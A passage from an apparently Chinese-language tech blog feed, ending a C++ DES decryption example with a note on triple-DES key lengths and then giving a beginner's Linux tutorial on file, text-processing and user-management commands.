class="comment">//将余数存放在数组Positive_Binary[BinarySize]中，这里先正序排放，下一步要倒叙排列</span></span><br><span class="line">		index--;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//将二进制转为十进制</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Convertion_2_16</span><span class="params">(<span class="type">int</span> M[], <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>&amp; m)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> Sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)</span><br><span class="line">	{</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> Pow = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">63</span> - i; j++)<span class="comment">//这里注意j=0,j&lt;63-i</span></span><br><span class="line">		{</span><br><span class="line">			Pow = Pow * <span class="number">2</span>;</span><br><span class="line">		}</span><br><span class="line">		<span class="comment">//cout &lt;&lt; "Pow=" &lt;&lt; Pow&lt;&lt;endl;</span></span><br><span class="line">		Sum = Sum + Pow * M[i];</span><br><span class="line">	}</span><br><span class="line">	m = Sum;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> k = <span class="number">0x133457799BBCDFF1</span>;<span class="comment">//密钥k（0x十六进制)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> c = <span class="number">0x85E813540F0AB405</span>;<span class="comment">//密文c （0x十六进制)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> m=<span class="number">0</span>;<span class="comment">//明文m</span></span><br><span class="line">	<span class="type">int</span> Key[<span class="number">64</span>] = {<span class="number">0</span>}; <span class="comment">//密钥数组(二进制)       初值全为0</span></span><br><span class="line">	<span class="type">int</span> Cipher[<span class="number">64</span>] = {<span class="number">0</span>};    <span class="comment">//密文数组(二进制)       初值全为0</span></span><br><span class="line">	<span class="type">int</span> M[<span class="number">64</span>] = {<span class="number">0</span>};   <span class="comment">//明文数组(二进制)       初值全为0</span></span><br><span class="line">	<span class="type">int</span> K[<span class="number">16</span>][<span class="number">48</span>]={<span class="number">0</span>};<span class="comment">//16组子密钥(二进制)   初值全为0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//十六进制密钥转为二进制，并输出二进制密钥</span></span><br><span class="line">	<span class="built_in">Convertion_16_2</span>( k, Key);</span><br><span class="line">	cout &lt;&lt; <span class="string">"密钥[64]="</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		cout &lt;&lt; Key[i];</span><br><span class="line">	}</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//十六进制密文转为二进制，并输出二进制密文</span></span><br><span class="line">	<span class="built_in">Convertion_16_2</span>(c, Cipher);</span><br><span class="line">	cout &lt;&lt; <span class="string">"密文[64]="</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		cout &lt;&lt; Cipher[i];</span><br><span class="line">	}</span><br><span class="line">	cout &lt;&lt; endl&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//制作16轮所有的密钥</span></span><br><span class="line">	<span class="built_in">Make_All_Key</span>( Key,  K);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//解密，并输出明文</span></span><br><span class="line">	<span class="built_in">D_C_to_M</span>(Cipher, K, M);</span><br><span class="line">	<span class="built_in">Convertion_2_16</span>(M, m);</span><br><span class="line">	cout &lt;&lt; <span class="string">"明文[64]="</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">	{</span><br><span class="line">		cout &lt;&lt; M[i];</span><br><span class="line">	}</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt;<span class="string">"明文为:"</span>&lt;&lt; hex &lt;&lt; m;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="三重DES算法"><a href="#三重DES算法" class="headerlink" title="三重DES算法"></a>三重DES算法</h3><blockquote>
<p>含有1个密钥的3重DES加密的有效密钥长度为<strong>56</strong><br>相当于一个DES密钥长度；<br>含有2个密钥的长度为：56 * 2 = 112<br>含有3个密钥的长度为：56 * 3 = 168</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%89%E9%87%8DDES%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B.png" alt="三重DES算法加解密过程"></p>
<h2 id="三-附录"><a href="#三-附录" class="headerlink" title="(三)附录"></a>(三)附录</h2><p>文章部分图片、代码引用于<a href="http://t.csdnimg.cn/6Vk0L">http://t.csdnimg.cn/6Vk0L</a></p>
]]></content>
      <categories>
        <category>密码体制</category>
      </categories>
      <tags>
        <tag>DES</tag>
        <tag>密码体制</tag>
        <tag>对称密码体制[私钥密码体制]</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux——基础</title>
    <url>/2024/04/16/Linux%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="linux系统入门："><a href="#linux系统入门：" class="headerlink" title="linux系统入门："></a>linux系统入门：</h1><h2 id="1-操作系统介绍"><a href="#1-操作系统介绍" class="headerlink" title="1.操作系统介绍"></a>1.操作系统介绍</h2><p>软件：驱动硬件</p>
<p>硬件：看得见，摸得着</p>
<p>操作系统：特殊的软件，控制硬件，内核+软件 </p>
<p>操作系统：</p>
<p>unix(1969年诞生于贝尔实验室)</p>
<p>硬件-系统(hp-ux)-软件</p>
<p>BSD:  freeBSD  黑莓</p>
<p>ios，mac os，<em>苹果</em>的 第一代 操作系统于1984年 发布</p>
<p>ms-dos  单任务</p>
<p>window 1.0  1985年发布  windows NT</p>
<p>开源  闭源</p>
<p>minix</p>
<p>linux:  1991年  林纳斯.托瓦兹 linux内核 1.0&#x2F;GPL</p>
<p>现在的操作系统：多任务，多用户</p>
<p>GNU:  贡献了很多免费使用的软件</p>
<p>GPL 协议</p>
<p>gnu&#x2F;linux:</p>
<p>中科麒麟</p>
<p>linux发行版：</p>
<p>linux内核</p>
<p>红帽redhat ： fedora   centos  最稳定企业服务器操作系统centos6 2.6.32 centos7  3.10  centos8 4.10</p>
<p>debian： ubuntu  kali  国产linux   内核 5.10 版本新 人工智能 自动驾驶 大数据</p>
<p>suse： opensuse  suse企业版</p>
<h2 id="2-centos系统的安装"><a href="#2-centos系统的安装" class="headerlink" title="2.centos系统的安装"></a>2.centos系统的安装</h2><p>ios镜像下载地址：</p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/centos-vault/7.8.2003/isos/x86_64/CentOS-7-x86_64-DVD-2003.iso">https://mirrors.tuna.tsinghua.edu.cn/centos-vault/7.8.2003/isos/x86_64/CentOS-7-x86_64-DVD-2003.iso</a></p>
<p>install 安装</p>
<p>test</p>
<p>media 媒体 媒介 光盘</p>
<p>lvm：逻辑卷</p>
<p>el7:  enterprise linux 7</p>
<p>linux远程控制：</p>
<p>telnet协议： 明文</p>
<p>ssh协议： 加密</p>
<h2 id="3-远程连接linux"><a href="#3-远程连接linux" class="headerlink" title="3.远程连接linux"></a>3.远程连接linux</h2><p>第一步：查看ip地址  ip addr</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程登录linux系统</span></span><br><span class="line">ssh  root@192.168.202.136</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">断开连接</span></span><br><span class="line">exit</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启系统</span></span><br><span class="line">reboot</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即关机</span></span><br><span class="line">shutdown  -h  now</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">十分钟之后关机</span></span><br><span class="line">shutdown  -h  10</span><br></pre></td></tr></table></figure>



<h2 id="4-文件操作"><a href="#4-文件操作" class="headerlink" title="4.文件操作"></a>4.文件操作</h2><p>命令1：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换目录</span></span><br><span class="line">cd  #全称change directory</span><br><span class="line">例子1：</span><br><span class="line">cd  local    #切换到子目录local</span><br><span class="line">cd  /usr/local  #切换到目录/usr/local</span><br><span class="line">cd  ..       #切换到上一级目录</span><br></pre></td></tr></table></figure>

<p>命令2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">print</span> work directory</span></span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<p>命令3：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">新建文件</span></span><br><span class="line">touch</span><br><span class="line">例子1： touch 1.txt  #创建单个文件</span><br><span class="line">例子2： touch test&#123;01..10&#125;.txt #批量创建文件</span><br><span class="line">例子3： touch /root/4.txt  #在制定的/root目录下，创建文件4.txt</span><br></pre></td></tr></table></figure>

<p>命令4：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目录下的文件</span></span><br><span class="line">ls全称list</span><br><span class="line">例子1：ls  test09.txt   #查看test09.txt是否存在</span><br><span class="line">例子2：ls  *.txt        #查看以txt结尾的所有文件</span><br><span class="line">例子3：ls  -1           #以一行一个文件的方式显示</span><br><span class="line">例子4：ls  -a           #查看所有文件，包括隐藏文件</span><br><span class="line">例子5：ls -a -1         #查看所有文件，以一行一个来显示</span><br><span class="line">例子6：ls -l            #以长格式查看文件</span><br></pre></td></tr></table></figure>

<p>以.开头的文件是隐藏文件，默认不显示</p>
<p>命令5：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重命名</span></span><br><span class="line">mv全称move</span><br><span class="line">例子1：mv .123.txt 123.txt   #将.123.txt文件重命名为123.txt</span><br><span class="line">例子2：mv 123.txt /opt       #将当前目录下的123.txt移动到/opt目录下</span><br></pre></td></tr></table></figure>

<p>命令6：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制</span></span><br><span class="line">cp全称copy</span><br><span class="line">例子1：cp test01.txt /opt/   #将当前目录下的test01.txt复制到/opt目录下</span><br><span class="line">例子2：cp -a dev04 /opt/     #将目录dev04复制到/opt下</span><br></pre></td></tr></table></figure>

<p>命令7：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除</span></span><br><span class="line">例子1:  rm /opt/123.txt  #将/opt目录下的123.txt文件删除，需要回复y确认删除</span><br><span class="line">例子2： rm -f /opt/test01.txt #将/opt目录下的test01.txt文件删除，不需要回复</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除一个目录，linux的参数大部分没有先后顺序</span></span><br><span class="line">[root@localhost ~]# rm -fr dev</span><br><span class="line">[root@localhost ~]# rm -rf dev01</span><br><span class="line">[root@localhost ~]# rm -f -r dev02</span><br><span class="line">[root@localhost ~]# rm -r -f dev03</span><br></pre></td></tr></table></figure>

<p>命令8：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建文件夹 创建目录directory</span></span><br><span class="line">mkdir 全称make directory </span><br><span class="line">例子1：mkdir dev   #创建一个dev目录</span><br><span class="line">例子2：mkdir dev&#123;01..10&#125;     #批量创建多个目录</span><br><span class="line">例子3：mkdir -p 1/2/3/4/5/6  #一次性创建多级子目录</span><br></pre></td></tr></table></figure>

<p>命令9：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vi编辑器</span></span><br><span class="line">例子1： vi  test03.txt   #编辑文件test03.txt</span><br><span class="line">默认是常规模式，按ioa键进入编辑模式</span><br><span class="line">在编辑模式中按esc回到常规模式</span><br><span class="line">常规模式按:进入命令模式</span><br><span class="line">命令模式按esc回到常规模式</span><br></pre></td></tr></table></figure>



<p>命令10：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从上往下顺序查看文本内容</span></span><br><span class="line">cat</span><br><span class="line">例子1：cat  test03.txt  #查看test03.txt的全部内容</span><br><span class="line">例子2：cat -n test03.txt #查看内容的时候显示行号</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从下往上倒着查看文本内容</span></span><br><span class="line">tac</span><br><span class="line">例子1：tac  test03.txt  #倒着查看test03.txt的全部内容</span><br></pre></td></tr></table></figure>

<p>命令11：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件头几行</span></span><br><span class="line">head</span><br><span class="line">例子1： head  test03.txt       #查看文件的前十行，默认</span><br><span class="line">例子2： head  -n 5 test03.txt  #查看文件的前5行</span><br><span class="line">例子3： head  -5  test03.txt   #查看文件的前5行</span><br></pre></td></tr></table></figure>

<p>命令12：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件倒数几行</span></span><br><span class="line">tail</span><br><span class="line">例子1： tail  test03.txt       #查看文件的倒数十行，默认</span><br><span class="line">例子2： tail  -n 5 test03.txt  #查看文件的倒数5行</span><br><span class="line">例子3： tail  -5  test03.txt   #查看文件的倒数5行</span><br></pre></td></tr></table></figure>

<p>管道</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:83:e4:d9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">       valid_lft 1253sec preferred_lft 1253sec</span><br><span class="line">    inet6 fe80::ffe1:31ed:56dc:d9aa/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# ip addr|tail -4</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">       valid_lft 1224sec preferred_lft 1224sec</span><br><span class="line">    inet6 fe80::ffe1:31ed:56dc:d9aa/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# ip addr|tail -4|head -1</span><br><span class="line">    inet 10.0.0.128/24 brd 10.0.0.255 scope global noprefixroute dynamic ens33</span><br><span class="line">[root@localhost ~]# ip addr|tail -4|head -1|cut -c 10-19</span><br><span class="line">10.0.0.128</span><br></pre></td></tr></table></figure>

<h2 id="5-目录结构"><a href="#5-目录结构" class="headerlink" title="5.目录结构"></a>5.目录结构</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin      #存放二进制的可执行文件，命令，特别重要，不能删除!</span><br><span class="line">/boot     #开机启动需要的文件， 特别重要，不能删除!</span><br><span class="line">/dev      #device设备文件，特别重要，不能删除!</span><br><span class="line">/etc      #存放配置文件，特别重要，不能删除!</span><br><span class="line">/home     #普通用户的家目录</span><br><span class="line">/lib      #library 32位库，一般是so结尾，特别重要，不能删除!</span><br><span class="line">/lib64    #library 64位库，一般是so结尾，特别重要，不能删除!</span><br><span class="line">/media    #多媒体</span><br><span class="line">/mnt      #mount挂载光盘，U盘</span><br><span class="line">/opt      #部分软件安装存储目录</span><br><span class="line">/proc     #process进程 ， 特别重要，不能删除!</span><br><span class="line">/root     #root用户的家目录，特别重要，不能删除!</span><br><span class="line">/run      #运行，程序运行的时候产生的文件</span><br><span class="line">/sbin     #super bin超级用户才能使用的命令 ，特别重要，不能删除!</span><br><span class="line">/srv      #源代码</span><br><span class="line">/sys      #system系统目录 ，特别重要，不能删除!</span><br><span class="line">/tmp      #用来存放临时文件的目录</span><br><span class="line">/usr      #用户级的目录，特别重要，不能删除!</span><br><span class="line">/var      #variable 变化的文件，特别重要，不能删除!</span><br></pre></td></tr></table></figure>

<p>命令13</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计</span></span><br><span class="line">wc</span><br><span class="line">wc -l按行统计，不会单独使用，需要接在管道后面</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test03.txt |wc -l</span><br><span class="line">18</span><br><span class="line">[root@localhost ~]# cat -n test03.txt </span><br><span class="line">     1	sdsdsdsdsdsdsd是的是的</span><br><span class="line">     2	</span><br><span class="line">     3	sdsd</span><br><span class="line">     4	65656</span><br><span class="line">     5	sdsd</span><br><span class="line">     6	sdsd</span><br><span class="line">     7	sdsd</span><br><span class="line">     8	33333</span><br><span class="line">     9	565656565</span><br><span class="line">    10	33333</span><br><span class="line">    11	565656565</span><br><span class="line">    12	33333</span><br><span class="line">    13	565656565</span><br><span class="line">    14	33333</span><br><span class="line">    15	565656565</span><br><span class="line">    16	</span><br><span class="line">    17	</span><br><span class="line">    18	sdssds  ;;;;</span><br></pre></td></tr></table></figure>

<p>命令14</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成数字序列</span></span><br><span class="line">seq</span><br><span class="line">例子1：产生一个5到12的序列</span><br><span class="line">[root@localhost ~]# seq 5 12</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line"></span><br><span class="line">例子2：产生一个5到12等宽的序列</span><br><span class="line">[root@localhost ~]# seq -w 5 12</span><br><span class="line">05</span><br><span class="line">06</span><br><span class="line">07</span><br><span class="line">08</span><br><span class="line">09</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p>命令15</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按行过滤字符串</span></span><br><span class="line">grep</span><br><span class="line">例子1： #普通过滤</span><br><span class="line">[root@localhost ~]# grep &#x27;3&#x27; test03.txt </span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">33333</span><br><span class="line">例子2： #显示行号</span><br><span class="line">[root@localhost ~]# grep -n &#x27;3&#x27; test03.txt </span><br><span class="line">8:33333</span><br><span class="line">10:33333</span><br><span class="line">12:33333</span><br><span class="line">14:33333</span><br></pre></td></tr></table></figure>

<p>grep精准匹配-w</p>
<p>命令16</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">按列过滤</span></span><br><span class="line">awk</span><br><span class="line">例子1： 取列,$1代表第一列，$2代表第二列，$NF代表最后一列</span><br><span class="line">[root@localhost ~]# cat test01.txt </span><br><span class="line">row 1, cell 1	row 1, cell 2</span><br><span class="line">row 2, cell 1	row 2, cell 2</span><br><span class="line">[root@localhost ~]# awk &#x27;&#123;print $1&#125;&#x27; test01.txt </span><br><span class="line">row</span><br><span class="line">row</span><br><span class="line">[root@localhost ~]# awk &#x27;&#123;print $2&#125;&#x27; test01.txt </span><br><span class="line">1,</span><br><span class="line">2,</span><br><span class="line">例子2：以逗号,做分隔符</span><br><span class="line">[root@localhost ~]# cat test01.txt </span><br><span class="line">row 1, cell 1	row 1, cell 2</span><br><span class="line">row 2, cell 1	row 2, cell 2</span><br><span class="line">[root@localhost ~]# awk -F &#x27;,&#x27;   &#x27;&#123;print $1&#125;&#x27; test01.txt </span><br><span class="line">row 1</span><br><span class="line">row 2</span><br><span class="line">[root@localhost ~]# awk -F &#x27;,&#x27;   &#x27;&#123;print $NF&#125;&#x27; test01.txt </span><br><span class="line"> cell 2</span><br><span class="line"> cell 2</span><br></pre></td></tr></table></figure>

<p>命令17</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">排序</span></span><br><span class="line">sort</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test02.txt</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">6</span><br><span class="line">4</span><br><span class="line">8</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">9</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td></tr></table></figure>

<p>命令18：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计去重</span></span><br><span class="line">uniq</span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">[root@localhost ~]# cat test02.txt|sort -n|uniq -c</span><br><span class="line">      2 1</span><br><span class="line">      3 2</span><br><span class="line">      3 3</span><br><span class="line">      2 4</span><br><span class="line">      3 5</span><br><span class="line">      2 6</span><br><span class="line">      2 7</span><br><span class="line">      1 8</span><br><span class="line">      1 9</span><br></pre></td></tr></table></figure>

<h2 id="6-用户和用户组管理"><a href="#6-用户和用户组管理" class="headerlink" title="6.用户和用户组管理"></a>6.用户和用户组管理</h2><p>命令19</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">作用查看所有用户最后的登录时间</span></span><br><span class="line">lastlog</span><br><span class="line">例子：</span><br><span class="line">[root@qstack ~]# lastlog </span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             pts/0    111.198.38.138   Mon Sep  6 11:17:25 +0800 2021</span><br><span class="line">bin                                        **Never logged in**</span><br><span class="line">daemon                                     **Never logged in**</span><br><span class="line">adm                                        **Never logged in**</span><br><span class="line">lp                                         **Never logged in**</span><br><span class="line">sync                                       **Never logged in**</span><br><span class="line">shutdown                                   **Never logged in**</span><br><span class="line">halt                                       **Never logged in**</span><br><span class="line">mail                                       **Never logged in**</span><br><span class="line">uucp                                       **Never logged in**</span><br><span class="line">operator                                   **Never logged in**</span><br><span class="line">games                                      **Never logged in**</span><br><span class="line">gopher                                     **Never logged in**</span><br></pre></td></tr></table></figure>

<p>命令20：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建用户</span></span><br><span class="line">useradd </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建一个用户</span></span><br><span class="line">例子1：useradd  test1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建用户，并给用户指定用户组</span></span><br><span class="line">例子2：</span><br><span class="line">[root@localhost tmp]# useradd  -g test1  test3</span><br><span class="line">[root@localhost tmp]# id test3</span><br><span class="line">uid=1002(test3) gid=1000(test1) 组=1000(test1)</span><br></pre></td></tr></table></figure>

<p>命令21：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置密码</span></span><br><span class="line">passwd</span><br><span class="line">例子1：passwd  test1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用root用户给普通用户修改密码</span></span><br><span class="line">[root@localhost ~]# passwd test1</span><br><span class="line">更改用户 test1 的密码 。</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码是一个回文</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：所有的身份验证令牌已经成功更新。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">普通用户自己修改密码</span></span><br><span class="line">[test1@localhost ~]$ passwd </span><br><span class="line">更改用户 test1 的密码 。</span><br><span class="line">为 test1 更改 STRESS 密码。</span><br><span class="line">（当前）UNIX 密码：</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码少于 8 个字符</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码少于 8 个字符</span><br><span class="line">新的 密码：</span><br><span class="line">无效的密码： 密码未通过字典检查 - 过于简单化/系统化</span><br><span class="line">passwd: 已经超出服务重试的最多次数</span><br><span class="line"></span><br><span class="line">例子3：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">免交互修改密码</span></span><br><span class="line">echo 123456|passwd --stdin test1</span><br></pre></td></tr></table></figure>

<p>命令22：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查用户是否存在</span></span><br><span class="line">id</span><br><span class="line">例子1: </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户存在，系统的返回结果</span></span><br><span class="line">[root@localhost ~]# id test1</span><br><span class="line">uid=1000(test1) gid=1000(test1) 组=1000(test1)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用户不存在，系统的返回结果</span></span><br><span class="line">[root@localhost ~]# id test2</span><br><span class="line">id: test2: no such user</span><br></pre></td></tr></table></figure>

<p>命令23：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除用户</span></span><br><span class="line">userdel</span><br><span class="line">例子1：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被删除的用户还在登录状态</span></span><br><span class="line">[root@localhost ~]# userdel test1</span><br><span class="line">userdel: user test1 is currently used by process 2356</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">被删除的用户，退出登录之后，可以正常删除</span></span><br><span class="line">[root@localhost ~]# userdel test1</span><br></pre></td></tr></table></figure>

<p>命令24：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改用户信息</span></span><br><span class="line">usermode</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">锁定用户</span></span><br><span class="line">例子1：</span><br><span class="line">[root@localhost ~]# usermod -L test1  -U 解锁</span><br><span class="line">[root@localhost ~]# lchage -l test1</span><br><span class="line">帐号被锁。</span><br><span class="line">至少:	0</span><br><span class="line">至多:	99999</span><br><span class="line">警告:	7</span><br><span class="line">不活跃：	从不</span><br><span class="line">最后一次改变：	2021年07月20日</span><br><span class="line">密码过期：	从不</span><br><span class="line">密码不活跃：	从不</span><br><span class="line">帐号过期：	从不</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">禁止用户登录</span></span><br><span class="line">[root@localhost ~]# usermod -s /sbin/nologin test2</span><br><span class="line">[root@localhost ~]# grep -w &#x27;test2&#x27; /etc/passwd</span><br><span class="line">test2:x:1001:1001::/home/test2:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>命令25：</p>
